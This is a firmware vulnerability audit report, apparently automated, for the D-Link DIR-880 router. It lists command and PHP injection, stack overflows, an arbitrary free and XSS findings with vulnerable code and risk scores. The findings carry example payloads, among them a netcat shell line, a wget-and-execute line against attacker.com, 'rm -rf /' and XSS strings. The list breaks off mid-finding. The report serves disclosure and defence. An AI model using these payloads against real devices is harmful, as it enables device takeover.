# _DIR-880 (37 findings)

---

### CodeInjection-form_portforwarding

- **File/Directory Path:** `htdocs/mydlink/form_portforwarding`
- **Location:** `form_portforwarding:~18-40`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** In form_portforwarding.php, when processing port forwarding configuration (settingsChanged POST parameter is 1), the script directly writes user-provided POST data to a temporary PHP file (/tmp/form_portforwarding.php) and executes that file using the dophp function. Since the input is not validated or filtered, an attacker can inject malicious PHP code in POST parameters, leading to server-side arbitrary command execution. The trigger condition is submitting a POST request containing settingsChanged=1. Potential exploitation methods include inserting PHP code (such as `'; system('id'); //`) in fields like 'name_*' or 'ip_*', thereby executing system commands, reading files, or escalating privileges.
- **Code Snippet:**
  ```
  $tmp_file = "/tmp/form_portforwarding.php";
  ...
  fwrite("a", $tmp_file, "$enable = $_POST["enabled_".$i."];\n");
  fwrite("a", $tmp_file, "$name = $_POST["name_".$i."];\n");
  // Similar lines for other POST parameters
  dophp("load",$tmp_file);
  ```
- **Keywords:** $_POST[settingsChanged], $_POST[enabled_*], $_POST[name_*], $_POST[public_port_*], $_POST[public_port_to_*], $_POST[sched_name_*], $_POST[ip_*], $_POST[private_port_*], $_POST[hidden_private_port_to_*], $_POST[protocol_*], /tmp/form_portforwarding.php, dophp
- **Notes:** The attacker requires valid login credentials but not root user. The temporary file path is fixed, but the file is not immediately deleted after execution, potentially leaving traces. It is recommended to validate and filter all POST inputs, avoiding writing user data directly into executable files. Associated functions include fwrite and dophp. Subsequent analysis of the dophp function's implementation can confirm the execution context.

---
### Command-Injection-PPP-TTY-Config

- **File/Directory Path:** `etc/services/INET/inet_ppp4.php`
- **Location:** `inet_ppp4.php:~150 (inside the if ($over=="tty") block)`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** In PPP configuration under TTY mode, the APN (Access Point Name) and dial number user inputs are not properly escaped and are directly used to build shell commands, leading to a command injection vulnerability. Attackers can modify these settings through the web interface or other interfaces, inserting malicious shell commands (such as using semicolons or pipe symbols). When the PPP connection starts, these commands will be executed with root privileges. Trigger conditions include: the device uses a USB modem (TTY mode), the attacker has valid login credentials and can modify the PPP configuration, and the PPP connection is started (e.g., via service restart or event trigger). Exploitation methods include inserting commands in the APN or dial number fields (e.g., '; nc -l -p 4444 -e /bin/sh;') to obtain a reverse shell or execute arbitrary system commands. The code lacks input validation and escaping, allowing attackers to control command execution.
- **Code Snippet:**
  ```
  fwrite(a, $START,
      'xmldbc -s '.$ttyp.'/apn "'.$apn.'"\n'.
      'xmldbc -s '.$ttyp.'/dialno "'.$dialno.'"\n'.
      'usb3gkit -o /etc/ppp/chat.'.$inf.' -v 0x'.$vid.' -p 0x'.$pid.' -d '.$devnum.'\n'.
      );
  ```
- **Keywords:** /runtime/auto_config/apn, /runtime/auto_config/dialno, /inet/entry/ppp4/tty/apn, /inet/entry/ppp4/tty/dialno
- **Notes:** This vulnerability requires the attacker to be able to access the configuration interface (such as the web interface) and modify the APN or dial number settings. It is recommended to verify whether the web interface filters these inputs and whether the device is running in TTY mode. Subsequent analysis should check if other input points (such as PPPoE's AC name and service name) have similar issues.

---
### Command-Injection-xmldbc-timer

- **File/Directory Path:** `usr/sbin/xmldb`
- **Location:** `xmldb:0x0000b45c fcn.0000b45c`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** A command injection vulnerability exists in the 'xmldb' daemon through the 'xmldbc' client's timer functionality (-t option). The function that processes the timer command (tag:sec:command) uses system() to execute the command without proper input validation or sanitization. An attacker with valid login credentials (non-root user) can exploit this by crafting a malicious command string that includes shell metacharacters, leading to arbitrary command execution with the privileges of the xmldb daemon (typically root or elevated privileges). The vulnerability is triggered when the timer expires and the command is executed via system().
- **Code Snippet:**
  ```
  // Disassembly snippet from function 0x0000b45c showing system call
  // The function parses the timer command and passes it to system()
  // Example: xmldbc -t "tag:60:ls" would execute 'ls' after 60 seconds
  // But if command is "tag:60; rm -rf /", it would execute the injection
  system(command_string); // Command string is user-controlled from -t option
  ```
- **Keywords:** /var/run/xmldb_sock, xmldbc, -t, system
- **Notes:** This vulnerability requires the attacker to have access to run xmldbc commands, which is feasible with valid user credentials. The attack chain is complete: user input -> command parsing -> system() execution. Further analysis could verify if other options (e.g., -x) have similar issues. The daemon typically runs as root, so command execution gains root privileges.

---
### CommandInjection-_startklips-klipsinterface

- **File/Directory Path:** `usr/lib/ipsec/_startklips`
- **Location:** `klipsinterface function and getinterfaceinfo function in the _startklips script`
- **Risk Score:** 9.0
- **Confidence:** 9.0
- **Description:** A command injection vulnerability was discovered in the '_startklips' script. An attacker can inject arbitrary commands by controlling the interface specification in the command line parameters (such as 'ipsec0=eth0; malicious_command'). Trigger condition: when the script runs with root privileges (for example, during system startup), an attacker as a non-root user can influence the script's call parameters. The vulnerability is located in the `klipsinterface` function, where the `phys` variable is extracted from user input and directly passed to the `getinterfaceinfo` function, which uses the `ip addr show dev $phys` command. Due to lack of input validation and escaping, if `phys` contains shell metacharacters (such as semicolons), malicious commands can be executed. Exploitation method: an attacker calls the script and passes a malicious interface parameter, such as `_startklips --log daemon.error 'ipsec0=eth0; whoami'`, causing the `whoami` command to execute with root privileges. This vulnerability allows a complete attack chain from user input to dangerous operations (arbitrary command execution).
- **Code Snippet:**
  ```
  klipsinterface() {
  	# pull apart the interface spec
  	virt=\`expr $1 : '\([^=]*\)=.*'\`
  	phys=\`expr $1 : '[^=]*=\(.*\)'\`
  
  	# ...
  
  	# figure out config for interface
  	phys_addr=
  	eval \`getinterfaceinfo $phys phys_\`
  	if test " $phys_addr" = " "
  	then
  		echo "unable to determine address of \\`$phys'"
  		exit 1
  	fi
  	# ...
  }
  
  getinterfaceinfo() {
  	ip addr show dev $1 | awk '
  	BEGIN {
  		MTU=""
  		TYPE="unknown"
  	}
  	/BROADCAST/   { TYPE="broadcast" }
  	/POINTOPOINT/ { TYPE="pointtopoint" }
  	/mtu/ {
  			sub("^.*mtu ", "", $0)
  			MTU=$1
  		}
  	$1 == "inet" || $1 == "inet6" {
  			split($2,addr,"/")
  			other=""
  			if ($3 == "peer")
  				other=$4
  			print "'$2'type=" TYPE
  			print "'$2'addr=" addr[1]
  			print "'$2'mask=" addr[2]
  			print "'$2'otheraddr=" other
  			print "'$2'mtu=" MTU
  			exit 0
  		}'
  }
  ```
- **Keywords:** Command line parameters (interface specification, e.g., ipsec0=eth0), Environment variable IPSEC_INIT_SCRIPT_DEBUG, Environment variable IPSECprotostack, File path /proc/sys/net/ipsec, File path /var/run/pluto/ipsec.info
- **Notes:** This vulnerability requires the script to run with root privileges, which may occur during system startup or IPsec configuration. The attacker needs permission to call the script or influence its parameters (for example, through other services). It is recommended to add input validation and escaping, such as using quotes or whitelist validation for interface names. Subsequent analysis can check if other scripts (such as '_startnetkey') have similar issues.

---
### Untitled Finding

- **File/Directory Path:** `etc/services/WIFI/rtcfg.php`
- **Location:** `rtcfg.php: dev_start function and try_set_psk_passphrase function`
- **Risk Score:** 9.0
- **Confidence:** 8.5
- **Description:** A command injection vulnerability was discovered in 'rtcfg.php', allowing authenticated non-root users to execute arbitrary shell commands by manipulating wireless network settings (such as SSID or pre-shared key). The vulnerability stems from user input being embedded unfiltered into 'nvram set' commands, which are output as a shell script and executed. An attacker can inject malicious commands (for example, by setting the SSID to '\"; malicious_command; #') to break the command structure and execute arbitrary code. Since the script may be invoked by the web server with root privileges, successful exploitation could lead to full system compromise. Trigger conditions include the attacker possessing valid login credentials and being able to modify wireless configuration (e.g., via the web interface), subsequently triggering script execution (such as applying settings or device reboot).
- **Code Snippet:**
  ```
  In the dev_start function: echo "nvram set ".$wl_prefix."_ssid=\"" . get("s", $wifi."/ssid") . "\"\n";
  In the try_set_psk_passphrase function: $key = query($wifi."/nwkey/psk/key"); echo "nvram set ".$wl_prefix."_wpa_psk=\"" . $key . "\"\n";
  ```
- **Keywords:** wlx_ssid, wlx_wpa_psk, wifi/ssid, wifi/nwkey/psk/key, ACTION, PHY_UID
- **Notes:** The complete exploitation chain of the vulnerability relies on the web interface or other components calling this script and passing user-controllable parameters. It is recommended to further validate the input filtering mechanisms of the 'get' and 'query' functions (located in include files such as 'xnode.php') and check the script execution context (whether it runs as root). Other potential injection points include WEP key settings, but WEP is no longer commonly used. Associated file: /htdocs/phplib/xnode.php (may contain input processing logic).

---
### PHP-Injection-form_macfilter

- **File/Directory Path:** `htdocs/mydlink/form_macfilter`
- **Location:** `form_macfilter (specific line number unknown, but the code is located in the loop at the fwrite and dophp call points)`
- **Risk Score:** 9.0
- **Confidence:** 8.0
- **Description:** In the 'form_macfilter' script, there is a PHP code injection vulnerability that allows attackers to execute arbitrary code through malicious POST parameters. Specifically: when settingsChanged=1 and last is empty, the script writes $_POST values (such as entry_enable_i, mac_i, mac_hostname_i, mac_addr_i, sched_name_i) directly to a temporary file /tmp/form_macfilter.php within a loop, and then loads and executes it using dophp('load', $tmp_file). Due to a lack of input validation and filtering, attackers can inject PHP code into these parameters (e.g., '1; system("id"); //'), leading to code execution. Trigger condition: the attacker sends a POST request to this script, sets settingsChanged=1, and ensures last is empty (by not setting or clearing entry_enable_$max), then injects code into any entry_* parameter. Potential attacks include executing system commands, downloading malware, or escalating privileges. The exploitation method is simple, requiring only one HTTP request.
- **Code Snippet:**
  ```
  fwrite("a", $tmp_file, "$enable = $_POST[\"entry_enable_".$i."\"];\n");
  fwrite("a", $tmp_file, "$mac = $_POST[\"mac_".$i."\"];\n");
  fwrite("a", $tmp_file, "$mac_hostname = $_POST[\"mac_hostname_".$i."\"];\n");
  fwrite("a", $tmp_file, "$mac_addr = $_POST[\"mac_addr_".$i."\"];\n");
  fwrite("a", $tmp_file, "$sched_name = $_POST[\"sched_name_".$i."\"];\n");
  dophp("load",$tmp_file);
  ```
- **Keywords:** $_POST['settingsChanged'], $_POST['macFltMode'], $_POST['entry_enable_*'], $_POST['mac_*'], $_POST['mac_hostname_*'], $_POST['mac_addr_*'], $_POST['sched_name_*'], /tmp/form_macfilter.php, dophp
- **Notes:** The vulnerability is based on code analysis evidence but has not been validated during actual runtime. The dophp function might come from an include file (such as /htdocs/mydlink/libservice.php); it is recommended to further analyze these files to confirm its behavior. The attack chain is complete, from input to code execution, but actual exploitation might be affected by web server permissions (higher risk if running as root). Related function: get_valid_mac might filter the mac field, but other fields have no filtering. Next steps: verify the dophp function definition and check for other similar vulnerabilities in related scripts.

---
### Untitled Finding

- **File/Directory Path:** `etc/services/INET/inet_ppp4_combo.php`
- **Location:** `inet_ppp4_combo.php in the lower_dhcp function (specific code location approximately in the middle of the file, at the udhcpc command concatenation point)`
- **Risk Score:** 9.0
- **Confidence:** 8.0
- **Description:** In the lower_dhcp function, the hostname is obtained from '/device/hostname' and directly concatenated into the udhcpc command without proper escaping or validation. An attacker (a non-root user with valid login credentials) can set a malicious hostname (such as a string containing semicolons or backticks) through the web interface or API. When the PPP connection uses DHCP mode, the lower_dhcp function is called, generating and executing the udhcpc command, leading to command injection. Vulnerability trigger conditions: PPP connection configured for DHCP mode, and the hostname is modified to a malicious value. Exploitation method: Inject arbitrary commands to obtain root privileges and gain full control of the device.
- **Code Snippet:**
  ```
  DIALUP('udhcpc '.$unicast.'-i '.$ifname.' -H '.$hostname.' -p '.$udhcpc_pid.' -s '.$udhcpc_helper.' &');
  ```
- **Keywords:** /device/hostname, lower_dhcp, inet_ppp4_combo.php, udhcpc
- **Notes:** Evidence is based on code analysis, showing direct string concatenation without filtering. It is recommended to further verify whether the hostname is user-controllable via the web interface or API, and check if there are input filtering mechanisms in included files (such as /htdocs/phplib/trace.php). Related file: /etc/services/INET/options_ppp4.php may contain relevant configurations.

---
### Command-Injection-DS_IPT-wfa_igd_handle

- **File/Directory Path:** `etc/scripts/wfa_igd_handle.php`
- **Location:** `wfa_igd_handle.php in DS_IPT mode processing block (approximately lines 150-180)`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** In the DS_IPT mode processing of the wfa_igd_handle.php file, there is a command injection vulnerability. Attackers can inject malicious commands by controlling the $C_IP or $E_PORT variables. Trigger condition: The attacker sends a request with MODE=DS_IPT and provides malicious $C_IP or $E_PORT values (for example, a string containing semicolons or backticks). Exploitation method: Because the variables are directly concatenated into the iptables command string and executed via exe_ouside_cmd, the injected command will run with the Web server process privileges (possibly root). The lack of input validation and boundary checks allows arbitrary command execution.
- **Code Snippet:**
  ```
  else if($MODE=="DS_IPT")  //add directserver iptable rules
  {
      $ipt_cmd="";
      
      if($C_IP=="0.0.0.0")
          {$ipt_cmd="PRE.WFA -p tcp";}
      else
          {$ipt_cmd="PRE.WFA -p tcp -s ".$C_IP;}
          
      if($SSL == '0')
          {$ipt_cmd=$ipt_cmd." --dport ".$E_PORT." -j REDIRECT --to-ports ".query("/webaccess/httpport");}
      else
          {$ipt_cmd=$ipt_cmd." --dport ".$E_PORT." -j REDIRECT --to-ports ".query("/webaccess/httpsport");}
      
      if($ipt_cmd!="")
      {
          $del_ipt="iptables -t nat -D ".$ipt_cmd;
          exe_ouside_cmd($del_ipt);
          $add_ipt="iptables -t nat -A ".$ipt_cmd;
          exe_ouside_cmd($add_ipt);
      }
      // ... more code
  }
  ```
- **Keywords:** $C_IP, $E_PORT, $MODE, /runtime/webaccess/
- **Notes:** The vulnerability exploitation chain is complete: untrusted input ($C_IP/$E_PORT) → command construction → execution. It is recommended to verify Web server runtime permissions and input point accessibility. Other modes (such as SEND_IGD) may also have similar issues, but the DS_IPT mode has the clearest evidence.

---
### Command-Injection-dhcps6-commands

- **File/Directory Path:** `etc/services/DHCPS/dhcps6.php`
- **Location:** `dhcps6.php:commands function (specific line numbers not shown in output, but code snippet appears multiple times, e.g., where radvd and dhcp6s commands are generated)`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** In the `commands` function of 'dhcps6.php', the user-controllable `$inf` parameter (interface UID) is directly inserted into shell command strings, lacking proper input validation or escaping, leading to a command injection vulnerability. An attacker can inject arbitrary commands via a maliciously crafted `$name` parameter (passed to the `dhcp6setup` function). Trigger condition: When the script processes DHCPv6 configuration, it calls the `dhcp6setup` function and executes related commands. Exploitation method: An attacker sets `$name` to contain shell metacharacters (such as semicolons, backticks), e.g., 'attacker; echo hacked', thereby injecting and executing malicious code during command execution. This vulnerability allows non-root users to escalate privileges or execute system commands.
- **Code Snippet:**
  ```
  Example code snippet:
  - \`startcmd('radvd -C '.$racfg.' -p '.$rapid);\` // $racfg contains $inf
  - \`startcmd('dhcp6s -c '.$dhcpcfg.' -P '.$dhcppid.' -s '.$hlp.' -u '.$inf.' '.$ifname);\` // $inf is used directly in the command
  Here, $inf comes from the $name parameter and is used in string concatenation without validation.
  ```
- **Keywords:** $name parameter (user input), /var/run/radvd.*.conf, /var/run/dhcps6.*.conf, radvd command, dhcp6s command
- **Notes:** This vulnerability requires the attacker to be already authenticated and able to call the relevant functions (e.g., via the web management interface). It is recommended to check the input source and implement strict input validation and escaping. Subsequent analysis can examine other components that call this script to confirm the attack vector.

---
### Command-Injection-upnp-NOTIFY-WFADEV-host

- **File/Directory Path:** `etc/scripts/upnp/run.NOTIFY-WFADEV.php`
- **Location:** `run.NOTIFY-WFADEV.php: In the foreach ($SERVICE."/subscription") loop (specific line number unavailable, but from the code structure it is located within the loop body)`
- **Risk Score:** 8.5
- **Confidence:** 9.0
- **Description:** The command injection vulnerability exists in the use of the $host variable. When processing UPnP event notifications, the script obtains the $host value via `query("host")` (from the UPnP subscription request) and directly embeds it into the `-d` parameter of the `httpc` command. Since $host is wrapped in double quotes but not escaped, an attacker can inject special characters (such as `"; malicious_command; "`) into $host to break out of the double quote restriction and execute arbitrary commands. Trigger condition: An attacker sets a malicious 'host' value via a UPnP subscription; when the device processes the notification, the script executes and triggers the command injection. Constraint: The attacker must possess valid login credentials and be connected to the device network. Potential attack method: Inject a command like `"; wget http://attacker.com/malware.sh -O /tmp/malware.sh; sh /tmp/malware.sh; "` into $host, leading to remote code execution. Related code logic: Data flows from the UPnP request to `query("host")`, and is ultimately executed within the `httpc` command.
- **Code Snippet:**
  ```
  From the relevant code in 'run.NOTIFY-WFADEV.php':
  foreach ($SERVICE."/subscription")
  {
  	$host = query("host");
  	// ... other code ...
  	echo "cat ".$temp_file." | httpc -i ".$phyinf." -d \"".$host."\" -p TCP > /dev/null\n";
  }
  ```
- **Keywords:** $host, UPnP subscription host field, /runtime/services/upnp/inf, httpc command, /var/run/WFAWLANConfig-*-payload
- **Notes:** The vulnerability can be exploited by a logged-in non-root user, as UPnP subscriptions might be accessible via the network interface. Similar vulnerabilities were confirmed in 'run.NOTIFY-PROPCHANGE.php' by the ParallelTaskDelegator subtask, increasing credibility. It is recommended to check included files (such as gena.php) to verify variable sources, but current evidence is sufficient to confirm the vulnerability. Subsequent analysis of the httpc binary can assess the impact scope.

---
### BufferOverflow-nvram_set

- **File/Directory Path:** `usr/sbin/nvram`
- **Location:** `nvram:0x00008754 (function fcn.00008754, strncpy call site)`
- **Risk Score:** 8.5
- **Confidence:** 8.0
- **Description:** A stack buffer overflow vulnerability was discovered in the 'set' operation of the 'nvram' binary. When a user executes the 'nvram set name=value' command, the 'value' parameter is processed and copied to a stack buffer using strncpy. strncpy uses a fixed size of 0x10000 (65536 bytes), but the available space in the target buffer is only about 65496 bytes, causing an overflow of 40 bytes. The overflow overwrites saved registers (such as R11, LR) and the return address on the stack. Trigger condition: the 'value' parameter length >= 65496 bytes. Potential attack: an attacker can craft a malicious parameter value to overwrite the return address, hijack the control flow, and execute arbitrary code. Exploitation method: as a logged-in user, run 'nvram set name=<long_string>' where <long_string> length >= 65496 bytes and contains shellcode or a ROP chain. The code logic is in the 'set' branch of function fcn.00008754, involving strncpy and subsequent strsep calls.
- **Code Snippet:**
  ```
  // From decompiled function fcn.00008754
  pcVar10 = ppcVar3[1]; // User-provided value parameter
  ppcVar4 = ppcVar3 + 1;
  if (pcVar10 == NULL) goto code_r0x000087cc;
  iVar1 = iVar14 + -0x10000 + -4; // Calculate buffer address
  *(iVar14 + -4) = iVar1;
  sym.imp.strncpy(iVar1, pcVar10, 0x10000); // Buffer overflow here
  uVar2 = sym.imp.strsep(iVar14 + -4, iVar5 + *0x89b0); // May read out-of-bounds due to missing null terminator
  sym.imp.nvram_set(uVar2, *(iVar14 + -4));
  ```
- **Keywords:** nvram_set, strncpy, strsep
- **Notes:** The vulnerability has been verified through decompilation, but further dynamic testing is recommended to confirm exploitability (e.g., debugging the crash point). Related functions: fcn.00008754 (main logic), nvram_set (NVRAM interaction). The attack chain is complete: from command line input to stack overflow. Subsequent analysis could check if other operations (such as 'get') have similar issues, or analyze the NVRAM library itself.

---
### Command-Injection-fcn.0000be2c

- **File/Directory Path:** `usr/bin/minidlna`
- **Location:** `minidlna:0xc524 (fcn.0000be2c)`
- **Risk Score:** 8.0
- **Confidence:** 9.0
- **Description:** In function fcn.0000be2c, which handles command-line argument parsing for minidlna, a command injection vulnerability exists when processing the '-R' option. User-provided input from argv is directly used in a snprintf call as the format string without sanitization or bounds checking. The resulting buffer is then passed to the system function, allowing arbitrary command execution. Trigger condition: minidlna is started with the '-R' option, and the attacker controls the argument to this option. Exploitation: an attacker can inject shell commands by providing a malicious string as the argument, e.g., 'minidlna -R "malicious_command; whoami"'. Constraints: the attacker must have influence over the command-line arguments used to start minidlna, which could be achieved through configuration files, service scripts, or direct execution if the attacker has shell access. The vulnerability is exploitable by a non-root user with valid login credentials if they can modify startup parameters or execute minidlna with controlled arguments.
- **Code Snippet:**
  ```
  case 6:
      ppiVar21 = *0xce7c;
      *(puVar26 + -0x11e4) = *(puVar26 + -0x11c0);
      sym.imp.snprintf(*(puVar26 + -0x11b0), 0x1000);  // User input used as format string
      iVar14 = sym.imp.system(*(puVar26 + -0x11b0));  // Buffer passed to system
      if (iVar14 != 0) {
          ppiVar21 = *0xcf4c;
          *(puVar26 + -0x11e4) = 0x2d8c | 0x30000;
          fcn.000314d8(3, 0, ppiVar21, 0x30c);
      }
      break;
  ```
- **Keywords:** argv, *(puVar26 + -0x11c0), *(puVar26 + -0x11b0)
- **Notes:** The vulnerability was verified through decompilation analysis, showing a clear data flow from argv to system. The snprintf call uses user input directly as the format string with no additional arguments, meaning the input is copied verbatim into the buffer. This constitutes a complete and exploitable command injection chain. Further validation could involve dynamic testing, but the static evidence is strong. Other functions with strcpy/sprintf usage were noted but lacked full input-to-exploit chains.

---
### Arbitrary Memory Free-ISAKMP-v2

- **File/Directory Path:** `usr/libexec/ipsec/pluto`
- **Location:** `pluto:0x0004bea4 sym.process_v2_packet -> pluto:0x0004d818 sym.complete_v2_state_transition -> pluto:0x0004ce50 sym.success_v2_state_transition -> pluto:0x0004d258 sym.leak_pfree`
- **Risk Score:** 8.0
- **Confidence:** 8.5
- **Description:** When processing version 2 ISAKMP packets, tainted data propagates through the function call chain to sym.leak_pfree, leading to arbitrary memory freeing. An attacker can manipulate specific fields in the version 2 packet (such as the state pointer) to control the memory address being freed, triggering use-after-free or double-free. Trigger condition: Sending a specially crafted version 2 ISAKMP packet to the Pluto daemon. Potential exploitation methods include memory corruption, code execution, or denial of service. Exploitation steps: 1) Attacker sends a malicious version 2 packet; 2) The packet enters processing via sym.process_packet; 3) Tainted data propagates to sym.leak_pfree, freeing memory at an arbitrary address.
- **Code Snippet:**
  ```
  In sym.success_v2_state_transition (address 0x0004d23c-0x0004d258):
  0x0004d23c: ldr r3, [var_34h]   ; Load tainted pointer (from packet) into r3
  0x0004d240: ldr r2, [r3, 0x240] ; Dereference pointer to get memory address
  0x0004d250: mov r0, r2          ; Pass address to r0
  0x0004d258: bl sym.leak_pfree   ; Call memory free, address is controllable, leading to arbitrary free
  ```
- **Keywords:** ISAKMP Packet Structure Pointer, sym.leak_pfree, UDP Port 500/4500, sym.process_v2_packet, sym.complete_v2_state_transition, sym.success_v2_state_transition
- **Notes:** The attack chain is complete and reproducible; tainted data propagates directly from the input point to the dangerous operation. An attacker, as an authenticated user, might send packets via an API or socket. It is recommended to audit memory management functions and implement input validation. Associated files may include state.c or vendorid.c (inferred from code references).

---
### Untitled Finding

- **File/Directory Path:** `sbin/httpd.c`
- **Location:** `httpd.c:A070 sub_A070`
- **Risk Score:** 8.0
- **Confidence:** 8.0
- **Description:** In the function `sub_A070` (authentication processing), there is a buffer overflow risk. Using `strcpy` to copy the username to a fixed-size buffer without checking the length. An attacker can provide an overly long username, causing a stack overflow. Trigger condition: attacker sends an overly long Authorization header. Exploitation method: overwrite the return address to execute arbitrary code.
- **Code Snippet:**
  ```
  strcpy(dest, &s2);  // dest size not validated
  ```
- **Keywords:** Authorization, strcpy
- **Notes:** Need to confirm buffer size, but the code lacks boundary checks. Recommend replacing with a safe function such as strncpy.

---
### command-injection-_updown.mast-functions

- **File/Directory Path:** `usr/lib/ipsec/_updown.mast`
- **Location:** `_updown.mast:addsource function (approx. line 400 in content), _updown.mast:changesource function (approx. line 430), _updown.mast:doipsecrule function (approx. line 500)`
- **Risk Score:** 8.0
- **Confidence:** 7.0
- **Description:** In multiple functions of the '_updown.mast' script, environment variables are directly inserted into shell command strings and executed via eval, lacking input validation and escaping, leading to command injection vulnerabilities. Specific manifestations: When IPsec events (such as connection establishment or disconnection) trigger script execution, functions like 'addsource', 'changesource', and 'doipsecrule' use environment variables (such as PLUTO_MY_SOURCEIP, PLUTO_INTERFACE, PLUTO_CONNECTION) to construct command strings, which are then executed via eval. If an attacker can control these environment variables and inject shell metacharacters (such as semicolons, backticks), arbitrary commands can be executed. Trigger conditions include: the IPsec daemon (Pluto) calls the script with root privileges, and environment variables are maliciously set (e.g., through spoofing or malicious connection configuration). Potential attack methods: inject commands such as '; rm -rf /' or '; /bin/sh' to obtain a root shell. Constraints: The attacker needs to be able to influence IPsec configuration or environment variables, but as a logged-in user, this might be achieved through application vulnerabilities or configuration errors.
- **Code Snippet:**
  ```
  addsource() {
      st=0
      if ! ip -o route get ${PLUTO_MY_SOURCEIP%/*} | grep -q ^local; then
          it="ip addr add ${PLUTO_MY_SOURCEIP%/*}/32 dev ${PLUTO_INTERFACE%:*}"
          oops="\`eval $it 2>&1\`"
          st=$?
          # ... error handling
      fi
      return $st
  }
  
  changesource() {
      st=0
      parms="$PLUTO_PEER_CLIENT"
      parms2="dev $PLUTO_INTERFACE"
      parms3="src ${PLUTO_MY_SOURCEIP%/*}"
      it="ip route $cmd $parms $parms2 $parms3"
      oops="\`eval $it 2>&1\`"
      # ... error handling
  }
  
  doipsecrule() {
      srcnet=$PLUTO_MY_CLIENT_NET/$PLUTO_MY_CLIENT_MASK
      dstnet=$PLUTO_PEER_CLIENT_NET/$PLUTO_PEER_CLIENT_MASK
      rulespec="--src $srcnet --dst $dstnet -m mark --mark 0/0x80000000 -j MARK --set-mark $nf_saref"
      if $use_comment ; then
          rulespec="$rulespec -m comment --comment '$PLUTO_CONNECTION'"
      fi
      it="iptables -t mangle -I NEW_IPSEC_CONN 1 $rulespec"
      oops="\`set +x; eval $it 2>&1\`"
      # ... error handling
  }
  ```
- **Keywords:** PLUTO_MY_SOURCEIP, PLUTO_INTERFACE, PLUTO_PEER_CLIENT, PLUTO_MY_CLIENT_NET, PLUTO_MY_CLIENT_MASK, PLUTO_PEER_CLIENT_NET, PLUTO_PEER_CLIENT_MASK, PLUTO_CONNECTION, /etc/sysconfig/pluto_updown, /etc/default/pluto_updown
- **Notes:** Evidence comes from the script content, showing direct use of environment variables in eval commands. Further verification is needed: 1) Whether the script runs with root privileges in a real environment (typically called by the Pluto daemon); 2) Whether environment variables can be controlled by an attacker (e.g., through IPsec configuration or network spoofing). Subsequent analysis of the Pluto daemon's permission mechanisms and configuration file access controls is recommended. Other related functions like 'updateresolvconf' might also have similar issues, but command injection is more directly exploitable.

---
### Command-Injection-auto

- **File/Directory Path:** `usr/libexec/ipsec/auto`
- **Location:** `File 'auto', lines 100-120 (specific location near 'echo "ipsec whack $async --name $names --initiate" | runit')`
- **Risk Score:** 7.5
- **Confidence:** 9.0
- **Description:** A command injection vulnerability was discovered in file 'auto'. The user-input 'names' parameter is directly concatenated into shell command strings in multiple operations (such as --up, --down, --add), lacking validation and filtering. For example, in the command 'echo "ipsec whack --name $names --initiate" | runit', if 'names' contains shell metacharacters (such as semicolon, &, |), they will be parsed as command separators when the 'runit' function executes, leading to arbitrary command injection. Trigger condition: an attacker executes the script as a non-root user and provides a malicious 'names' parameter, and the --showonly option is not used. The exploit chain is complete: the input point is clear, the data flow is direct, allowing execution of arbitrary commands. Potential attack example: executing './auto --up "foo; id"' injects the 'id' command.
- **Code Snippet:**
  ```
  case "$op" in
  --up)  echo "ipsec whack $async --name $names --initiate"    | runit ; exit ;;
  --down)        echo "ipsec whack --name $names --terminate"          | runit ; exit ;;
  --delete)         echo "ipsec whack --name $names --delete"  | runit ; exit ;;
  # Similar other operations
  runit() {
      if test "$showonly"
      then
          cat
      else
          (
              echo '('
              echo 'exec <&3'     # regain stdin
              cat
              echo ');'
          ) | ash $shopts |
              awk "/^= / { exit \$2 } $logfilter { print }"
      fi
  }
  ```
- **Keywords:** names variable, ipsec whack command, ipsec addconn command, /var/run/pluto/ipsec.info file path
- **Notes:** The vulnerability allows non-root users to execute arbitrary commands; although permissions are limited, it still constitutes a security risk. It is necessary to verify the script's permissions and accessibility in the actual environment; if run with setuid or higher privileges, the risk may escalate. The associated file '/var/run/pluto/ipsec.info' may contain configurations, but non-root users might not be able to control it. Suggested follow-up analysis: check if the 'ipsec whack' and 'ipsec addconn' binaries have other vulnerabilities, and verify the script's behavior in a real environment.

---
### XSS-music.php-show_media_list

- **File/Directory Path:** `htdocs/web/webaccess/music.php`
- **Location:** `music.php:JavaScript function show_media_list (specifically at the title attribute and text content insertion point)`
- **Risk Score:** 7.5
- **Confidence:** 8.5
- **Description:** In the client-side JavaScript code of 'music.php', the media file name (obj.name) returned from the server is directly inserted into the HTML title attribute and text content without escaping. If an attacker uploads a music file with a filename containing a malicious script (for example, containing double quotes or HTML tags), when a user visits the music list page, the script may be executed. Trigger condition: After logging in, the user visits the music.php page and views the music list containing the malicious filename. Potential exploitation method: The attacker uploads a music file with a filename like '" onmouseover="alert(1)"' or '<script>alert(1)</script>'. When the user hovers their mouse or views the list, arbitrary JavaScript code is executed, potentially leading to session theft or further attacks. Constraints: The attacker needs to have file upload permissions (non-root user), and the data returned by the server is unfiltered.
- **Code Snippet:**
  ```
  var req="/dws/api/GetFile?id=" + storage_user.get("id")+"&volid="+obj.volid+"&path="+encodeURIComponent(obj.path)+"&filename="+encodeURIComponent(obj.name);
  str += "<tr onMouseOver=\"this.style.background='#D8D8D8'\" onMouseOut=\"this.style.background=''\">"
       + "<td width=\"36\" height=\"36\" class=\"tdbg\">"
       + "<img src=\"webfile_images/icon_music.png\" width=\"36\" height=\"36\" border=\"0\">"
       + "</td>"
       + "<td width=\"868\" class=\"text_2\">"
       + "<a rel=\"musicl\" href=\""+req+"\" title=\"" + obj.name + "\">"
       + "<div>"
       + file_name + "<br>" + get_file_size(obj.size) + ", " + obj.mtime
       + "</div>"
       + "</a>"
       + "</td></tr>"
  ```
- **Keywords:** obj.name, media_info.files[i].name, /dws/api/GetFile
- **Notes:** This vulnerability relies on the server returning unfiltered filename data. It is recommended to verify server-side filtering and escaping of filenames. Further analysis of the file upload mechanism and related APIs (such as /dws/api/GetFile) is needed to confirm the completeness of the attack chain. Associated files may include upload handling scripts and server-side API endpoints.

---
### DNS-Injection-get_filter

- **File/Directory Path:** `etc/services/DNS/dnscfg.php`
- **Location:** `dnscfg.php get_filter function and genconf function`
- **Risk Score:** 7.5
- **Confidence:** 8.5
